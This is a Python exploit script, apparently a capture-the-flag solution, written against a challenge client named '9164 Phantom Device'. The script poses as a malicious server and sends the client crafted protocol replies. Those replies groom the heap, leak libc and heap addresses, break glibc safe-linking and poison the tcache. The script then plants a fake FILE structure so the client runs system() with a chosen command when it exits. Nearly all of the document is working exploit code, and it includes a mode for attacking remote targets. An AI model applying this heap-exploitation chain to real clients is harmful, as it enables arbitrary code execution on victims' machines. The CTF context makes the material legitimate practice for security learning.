#!/usr/bin/env python3
"""9164 Phantom Device - single-connection exploit (lane D).

One AFC connection:
  R0  read_dir "/"        empty
  R1  read_dir "/DCIM"    0x500 body, 5 NUL + 5x0x28 tokens -> unsorted chunk B
  R2  get_devinfo         empty
  R3  get_file_info       0x100 body, 3 NUL + 3x0x18 tokens
                          -> X = malloc(0x100) (0x110 chunk) carved out of B,
                             list/str1/str2/str3 (0x30 each) right above X,
                             X freed to tcache 0x110, the four 0x30 chunks to tcache 0x30
  R4  read_dir "/var"     empty
  R5  file_open #1        DATA 1/1: malloc(1) with an EMPTY 0x20 tcache splits the
                          last remainder -> handle = stale main_arena fd  (libc)
  R6  read#1              empty
  R7  file_open #2        DATA 0x28/0x28: malloc(0x28) pops list -> handle =
                          safe-linked fd to str3                                (heap)
  R8  read#2              empty
  R9  file_open #3        DATA 0x28/0x28: same pop, handle != 0
  R10 read#3              malloc(0x100)=X, 0x140 body: list.size=0x41,
                          list.fd = A1 ^ P
  R11 file_close #1       malloc(0x28) pops list -> 0x30 head = A1, free -> 0x40
  R12 file_close #2       malloc(0x28) returns A1, recv the fake-FILE .data image
  R13 file_close #3       empty

main then frees, puts("EXIT"), closes, returns -> exit -> _IO_cleanup ->
_IO_flush_all_lockp -> _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
-> system(fake FILE command).

Usage:
  python3 solve2.py local  [--cmd CMD] [--dump]
  python3 solve2.py remote HOST PORT [--cmd CMD]
"""
import os, socket, struct, subprocess, sys, time

MAGIC = b'CFA6LPAA'
_buf = b''
_text = []
HERE = os.path.dirname(os.path.abspath(__file__))
CHAL = HERE
FILES = os.path.join(CHAL, 'files')
LIBDIR = os.path.join(HERE, 'libdir_ubuntu')
CLIENT = os.path.join(FILES, 'client')
LOADER = os.path.join(LIBDIR, 'ld-linux-x86-64.so.2')
LIBC = os.path.join(LIBDIR, 'libc.so.6')

OFF_ARENA_BIN0 = 0x204b20
A1_DELTA = 0x2042f0
IMG_LEN = 0x12d0
OFF_STDERR = 0x2054e0
OFF_LIST_ALL = 0x2054c0
OFF_WFILE_JUMPS = 0x203228
OFF_SYSTEM = 0x58750
OFF_STDOUT = 0x2055c0
OFF_STDERR_LOCK = 0x206700

# heap layout constants (measured via /proc/pid/mem on provided client + libc)
X_OFF_IN_PAGE = 0x7c0
LIST_OFF_IN_PAGE = 0x8e0
STR3_OFF_IN_PAGE = 0x970


def libc_image(start, size):
    data = open(LIBC, 'rb').read()
    e_phoff = struct.unpack_from('<Q', data, 0x20)[0]
    e_phentsize = struct.unpack_from('<H', data, 0x36)[0]
    e_phnum = struct.unpack_from('<H', data, 0x38)[0]
    blob = None
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from('<I', data, o)[0] != 1:
            continue
        p_off, p_va = struct.unpack_from('<Q', data, o + 0x08)[0], struct.unpack_from('<Q', data, o + 0x10)[0]
        p_fsz, p_msz = struct.unpack_from('<Q', data, o + 0x20)[0], struct.unpack_from('<Q', data, o + 0x28)[0]
        if p_va <= start and start + size <= p_va + p_msz:
            avail = max(0, min(size, p_va + p_fsz - start))
            blob = bytearray(size)
            if avail:
                fo = p_off + start - p_va
                blob[:avail] = data[fo:fo + avail]
            break
    if blob is None:
        raise RuntimeError('libc vaddr %#x not mapped' % start)

    e_shoff = struct.unpack_from('<Q', data, 0x28)[0]
    e_shentsize = struct.unpack_from('<H', data, 0x3a)[0]
    e_shnum = struct.unpack_from('<H', data, 0x3c)[0]

    def sh(i):
        o = e_shoff + i * e_shentsize
        return (struct.unpack_from('<I', data, o + 4)[0], struct.unpack_from('<Q', data, o + 0x18)[0],
                struct.unpack_from('<Q', data, o + 0x20)[0], struct.unpack_from('<I', data, o + 0x28)[0])

    # R_X86_64_RELATIVE-style targets: classic RELA + packed RELR (DT_RELR)
    rel_relative = []      # offsets that need += base
    rel_symbol = []        # (offset, addend) for R_X86_64_64
    for i in range(e_shnum):
        typ, off, sz, link = sh(i)
        if typ == 4:       # SHT_RELA
            symoff = sh(link)[1]
            for j in range(sz // 24):
                o = off + j * 24
                r_off, r_info, r_add = struct.unpack_from('<QQq', data, o)
                if not (start <= r_off < start + size):
                    continue
                rt, rs = r_info & 0xffffffff, r_info >> 32
                if rt == 8:
                    rel_relative.append(r_off)
                elif rt == 1:
                    rel_symbol.append((r_off, struct.unpack_from('<Q', data, symoff + rs * 24 + 8)[0] + r_add))
        elif typ == 19:    # SHT_RELR
            nxt = 0
            for j in range(sz // 8):
                e = struct.unpack_from('<Q', data, off + j * 8)[0]
                if (e & 1) == 0:
                    if start <= e < start + size:
                        rel_relative.append(e)
                    nxt = e + 8
                else:
                    bits = e >> 1
                    for b in range(63):
                        if bits >> b & 1:
                            a = nxt + b * 8
                            if start <= a < start + size:
                                rel_relative.append(a)
                    nxt += 63 * 8
    return blob, rel_relative, rel_symbol


def build_image(libc, cmd):
    A1 = libc + A1_DELTA
    blob, rel_relative, rel_symbol = libc_image(A1_DELTA, IMG_LEN)
    for r_off in rel_relative:
        struct.pack_into('<Q', blob, r_off - A1_DELTA,
                         struct.unpack_from('<Q', blob, r_off - A1_DELTA)[0] + libc)
    for r_off, add in rel_symbol:
        struct.pack_into('<Q', blob, r_off - A1_DELTA, libc + add)

    off_err = OFF_STDERR - A1_DELTA
    off_list = OFF_LIST_ALL - A1_DELTA
    f = bytearray(0xe0)
    assert len(cmd) <= 0x60
    f[0:len(cmd)] = cmd
    struct.pack_into('<Q', f, 0x20, 0)   # _IO_write_base
    struct.pack_into('<Q', f, 0x28, 1)   # _IO_write_ptr  (> write_base)
    struct.pack_into('<Q', f, 0x68, 0)
    struct.pack_into('<Q', f, 0x80, 0)
    struct.pack_into('<Q', f, 0x88, libc + OFF_STDERR_LOCK)
    W_OFF = off_err - 0x68
    struct.pack_into('<Q', f, 0xA0, A1 + W_OFF)
    struct.pack_into('<Q', f, 0xC0, 0)
    struct.pack_into('<Q', f, 0xD8, libc + OFF_WFILE_JUMPS)
    blob[off_err:off_err + 0xe0] = f
    struct.pack_into('<Q', blob, off_list, A1 + off_err)
    VT_OFF = 0x1070
    VT = A1 + VT_OFF
    struct.pack_into('<Q', blob, W_OFF + 0x18, 0)
    struct.pack_into('<Q', blob, W_OFF + 0x20, 1)
    struct.pack_into('<Q', blob, W_OFF + 0x30, 0)
    struct.pack_into('<Q', blob, W_OFF + 0xE0, VT)
    struct.pack_into('<Q', blob, VT_OFF + 0x68, libc + OFF_SYSTEM)
    return bytes(blob)


def big_body(n=0x418):
    b = b''
    for i in range(5):
        b += bytes([0x41 + i]) * 0x48 + b'\x00'
    b += b'Z' * (n - len(b))
    assert b.count(b'\x00') == 5 and len(b) == n
    return b


def parse_body(n=0x100):
    b = b''
    for i in range(3):
        b += bytes([0x61 + i]) * 0x18 + b'\x00'
    b += b'D' * (n - len(b))
    assert b.count(b'\x00') == 3 and len(b) == n
    return b


def overflow_body(fd=None, size_list=0x41):
    """dump_here = X+0x10; list chunk at X+0x110 (size 0x108, fd 0x110)."""
    n = 0x140
    b = bytearray(b'H' * n)
    struct.pack_into('<Q', b, 0x100, 0)
    struct.pack_into('<Q', b, 0x108, size_list)
    if fd is not None:
        struct.pack_into('<Q', b, 0x110, fd)
    struct.pack_into('<Q', b, 0x118, 0)
    return bytes(b)


def solve_heap_page(fd_leak, heap_lo=0x5000_0000_0000, heap_hi=0x8000_0000_0000):
    y = fd_leak >> 12
    out = []
    for seed in range(1 << 12):
        P = seed
        for i in range(0, 52 - 12):
            bit = (y >> i) & 1
            if bit ^ ((P >> i) & 1):
                P |= 1 << (i + 12)
        if (P ^ (P >> 12)) == y and (P >> 52) == 0 and heap_lo <= (P << 12) < heap_hi:
            out.append(P)
    return out


def recvn(s, n):
    b = b''
    while len(b) < n:
        d = s.recv(n - len(b))
        if not d:
            raise EOFError('client closed')
        b += d
    return b


def read_request(s, timeout=10.0):
    global _buf
    s.settimeout(timeout)
    while True:
        i = _buf.find(MAGIC)
        if i < 0:
            if len(_buf) > 7:
                _text.append(_buf[:-7])
                _buf = _buf[-7:]
            d = s.recv(65536)
            if not d:
                raise EOFError('client closed')
            _buf += d
            continue
        if i:
            _text.append(_buf[:i])
            _buf = _buf[i:]
        while len(_buf) < 40:
            d = s.recv(65536)
            if not d:
                raise EOFError('client closed')
            _buf += d
        entire, this, pn, op = struct.unpack('<QQQQ', _buf[8:40])
        if this < 40 or this > 0x100000:
            _text.append(_buf[:1])
            _buf = _buf[1:]
            continue
        while len(_buf) < this:
            d = s.recv(65536)
            if not d:
                raise EOFError('client closed')
            _buf += d
        payload = _buf[40:this]
        _buf = _buf[this:]
        return entire, this, pn, op, payload


def reply(s, pn, op, body, ent, thi):
    s.sendall(MAGIC + struct.pack('<QQQQ', ent, thi, pn, op) + body)


class Dump:
    def __init__(self, pid):
        self.pid = pid

    def heap(self):
        for line in open('/proc/%d/maps' % self.pid):
            if '[heap]' in line:
                lo, hi = line.split()[0].split('-')
                return int(lo, 16), int(hi, 16)
        return None

    def show(self, tag):
        hm = self.heap()
        if not hm:
            return
        lo, hi = hm
        with open('/proc/%d/mem' % self.pid, 'rb') as f:
            f.seek(lo)
            data = f.read(min(0x4000, hi - lo))
        a = 0
        lines = []
        while a < len(data) - 16:
            prev, size = struct.unpack_from('<QQ', data, a)
            sz = size & ~0xf
            if sz == 0 or sz % 16 or sz > 0x40000:
                lines.append('brk@%#x' % (lo + a))
                break
            lines.append('%#x:sz%#x' % (lo + a, sz))
            a += sz
        bins = []
        for i in range(64):
            c = struct.unpack_from('<H', data, 0x10 + i * 2)[0]
            if c:
                bins.append('b%d(%#x)c%d=%#x' % (i, 0x20 + i * 16, c,
                                                 struct.unpack_from('<Q', data, 0x90 + i * 8)[0]))
        print('  [%s] H=%#x chunks: %s' % (tag, lo, ' '.join(lines[:24])), flush=True)
        print('  [%s] bins: %s' % (tag, ' '.join(bins)), flush=True)


def main():
    args = sys.argv[1:]
    mode = args[0]
    cmd = b'  echo LOCALPWN >&2\x00'
    if '--cmd' in args:
        cmd = args[args.index('--cmd') + 1].encode().decode('unicode_escape').encode() + b'\x00'
    dump = '--dump' in args
    print('cmd =', cmd, 'flags =', hex(struct.unpack('<I', cmd[:4])[0]), flush=True)

    if mode == 'local':
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        port = srv.getsockname()[1]
        srv.listen(1)
        env = dict(os.environ)
        env.pop('LD_LIBRARY_PATH', None)
        cmdv = [LOADER, '--library-path', LIBDIR, CLIENT, '127.0.0.1', str(port)]
        if '--gdb' in args:
            cmdv = ['gdb', '-q', '-batch', '-ex', 'set pagination off',
                    '-ex', 'handle SIGSEGV stop print',
                    '-ex', 'run', '-ex', 'bt', '-ex', 'info registers rip rdi rsi',
                    '--args'] + cmdv
        p = subprocess.Popen(cmdv,
                             cwd=FILES, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL,
                             stderr=subprocess.PIPE, env=env)
        conn, _ = srv.accept()
        dmp = Dump(p.pid) if dump else None
        print('pid', p.pid, flush=True)
    else:
        host, rport = args[1], int(args[2])
        conn = socket.create_connection((host, rport), timeout=15)
        dmp = None
        p = None
        print('remote', host, rport, flush=True)

    libc = None
    P = None
    A1 = None
    out = b''
    wait = 12.0
    try:
        idx = 0
        while True:
            ent, thi, pn, op, payload = read_request(conn, wait)
            wait = 12.0
            print('[%d] op=%d pn=%d pl=%r' % (idx, op, pn, payload[:16]), flush=True)
            if dmp:
                dmp.show('pre%d' % idx)

            if idx == 6:
                h = struct.unpack('<Q', payload[:8])[0] if len(payload) >= 8 else 0
                print('   H1(libc) = %#018x' % h, flush=True)
                cand = (h & ~0xff) | 0x20
                libc = cand - OFF_ARENA_BIN0
                print('   libc = %#x aligned=%s' % (libc, libc & 0xfff == 0), flush=True)
                if libc & 0xfff or libc >> 48:
                    raise RuntimeError('libc leak bad')
                A1 = libc + A1_DELTA
                if p is not None:
                    try:
                        real = None
                        for line in open('/proc/%d/maps' % p.pid):
                            if 'libc.so.6' in line and line.split()[2] == '00000000':
                                real = int(line.split('-')[0], 16)
                                break
                        print('   real libc base = %#x  match=%s' % (real, real == libc), flush=True)
                    except Exception as e:
                        print('   maps check failed', e, flush=True)
            if idx == 8:
                h = struct.unpack('<Q', payload[:8])[0]
                print('   H2(heap) = %#018x' % h, flush=True)
                sols = solve_heap_page(h)
                print('   heap pages:', [hex(x) for x in sols], flush=True)
                if len(sols) != 1:
                    raise RuntimeError('heap solve failed')
                P = sols[0]
                exp = P ^ ((P << 12) | STR3_OFF_IN_PAGE)
                print('   expect fd %#x vs leak %#x (masked match %s)' % (
                    exp, h, (exp & ~0xff) == (h & ~0xff)), flush=True)
            if idx == 10:
                h = struct.unpack('<Q', payload[:8])[0]
                print('   H3 = %#018x' % h, flush=True)

            body, ent_l, thi_l = b'', 0, 0
            if idx == 1:
                body = big_body(); ent_l = thi_l = len(body)
            elif idx == 3:
                body = parse_body(); ent_l = thi_l = len(body)
            elif idx == 5:
                body = b'A'; ent_l = thi_l = 1
            elif idx == 7:
                body = b'B' * 0x28; ent_l = 0x28; thi_l = 1
            elif idx == 9:
                body = b'C' * 0x28; ent_l = thi_l = 0x28
            elif idx == 10:
                body = overflow_body(fd=A1 ^ P, size_list=0x41); ent_l = 0x100; thi_l = len(body)
            elif idx == 11:
                body = b'E' * 0x28; ent_l = thi_l = 0x28
            if idx == 12:
                body = build_image(libc, cmd); ent_l = 0x28; thi_l = len(body)
                skip_send = True
            else:
                skip_send = False

            send_body = body[:thi_l] if thi_l < len(body) else body
            pre_image = None
            if skip_send:
                print('   (reply already pre-sent)', flush=True)
            else:
                if idx == 11:
                    # close#1 reply + close#2 (image) reply in ONE burst: the
                    # client then finds the whole 0x12d0 image already buffered
                    # when it does its single recv() for it.
                    pre_image = build_image(libc, cmd)
                if len(send_body) > 0x400:
                    reply(conn, pn, 2, b'', ent_l + 40, thi_l + 40)
                    time.sleep(0.12)
                    conn.sendall(send_body)
                elif pre_image is not None:
                    pkt = (MAGIC + struct.pack('<QQQQ', ent_l + 40, thi_l + 40, pn, 2) + send_body
                           + MAGIC + struct.pack('<QQQQ', 0x28 + 40, len(pre_image) + 40, pn + 1, 2)
                           + pre_image)
                    conn.sendall(pkt)
                    print('   (+ pre-sent image reply pn=%d, %d bytes)' % (pn + 1, len(pre_image)), flush=True)
                else:
                    reply(conn, pn, 2, send_body, ent_l + 40, thi_l + 40)
            print('   -> body=%d sent=%d ent=%#x this=%#x' % (len(body), len(send_body), ent_l + 40, thi_l + 40), flush=True)
            if idx == 12 and p is not None:
                time.sleep(0.05)
                try:
                    with open('/proc/%d/mem' % p.pid, 'rb') as f:
                        f.seek(libc + A1_DELTA)
                        got = f.read(0x40)
                        f.seek(libc + OFF_LIST_ALL)
                        la = struct.unpack('<Q', f.read(8))[0]
                        f.seek(libc + OFF_STDERR)
                        st = f.read(8)
                        f.seek(libc + OFF_STDERR + 0x20)
                        q = struct.unpack('<QQQQQQQ', f.read(0x38))  # 0x20..0x58
                        f.seek(libc + OFF_STDERR + 0xa0)
                        wd = struct.unpack('<Q', f.read(8))[0]
                        f.seek(libc + OFF_STDERR + 0xc0)
                        mo = struct.unpack('<i', f.read(4))[0]
                        f.seek(libc + OFF_STDERR + 0xd8)
                        vt = struct.unpack('<Q', f.read(8))[0]
                    print('   image@A1 = %s (want %s)' % (got[:16].hex(), body[:16].hex()), flush=True)
                    print('   _IO_list_all = %#x (want %#x)  stderr[0:8]=%s' % (
                        la, libc + OFF_STDERR, st.hex()), flush=True)
                    print('   FILE wb=%#x wp=%#x mode=%d wd=%#x vt=%#x' % (q[0], q[1], mo, wd, vt), flush=True)
                except Exception as e:
                    print('   mem check failed', e, flush=True)
            if thi_l < ent_l:
                wait = 40.0
                print('   (short this: client will block ~30s)', flush=True)
            idx += 1
    except EOFError:
        print('EOF', flush=True)
    except Exception as e:
        import traceback
        traceback.print_exc()
    finally:
        try:
            if p is not None:
                print('client poll before kill: %r' % (p.poll(),), flush=True)
                for f_ in ('wchan', 'syscall', 'status'):
                    try:
                        v = open('/proc/%d/%s' % (p.pid, f_)).read()
                        print('  /proc/%d/%s:' % (p.pid, f_), ' '.join(v.split()[:12]), flush=True)
                    except Exception as e:
                        print('  %s: %r' % (f_, e), flush=True)
                try:
                    print(subprocess.check_output(['ps', '-o', 'pid,ppid,stat,wchan:20,cmd', '--ppid', str(p.pid), '--pid', str(p.pid)]).decode(), flush=True)
                except Exception as e:
                    print('  ps: %r' % (e,), flush=True)
                time.sleep(0.4)
                try:
                    p.stdin.write(b'echo LOCAL_SH\n'); p.stdin.flush()
                except Exception:
                    pass
                time.sleep(0.8)
                if p.poll() is None:
                    p.kill()
                out = p.stderr.read() or b''
                print('=== CLIENT STDERR (%d) ===' % len(out), flush=True)
                sys.stdout.write(out.decode('latin-1', 'replace'))
            else:
                conn.settimeout(3.0)
                data = b''
                t0 = time.time()
                while time.time() - t0 < 15:
                    try:
                        d = conn.recv(65536)
                    except socket.timeout:
                        if b'CSCTF{' in data:
                            break
                        continue
                    if not d:
                        print('(socket closed)', flush=True)
                        break
                    data += d
                    sys.stdout.write(d.decode('latin-1', 'replace'))
                    sys.stdout.flush()
                    if b'CSCTF{' in data:
                        break
                print('=== SOCKET TAIL (%d) ===' % len(data), flush=True)
                out = data
        except Exception as e:
            print('tail error', e)

    txt = b''.join(_text)
    if txt:
        print('=== CLIENT TEXT (%d) ===' % len(txt), flush=True)
        sys.stdout.write(txt.decode('latin-1', 'replace'))
        sys.stdout.flush()
        out += txt
    if b'CSCTF{' in out:
        print('FLAG:', out.decode('latin-1'))


if __name__ == '__main__':
    main()
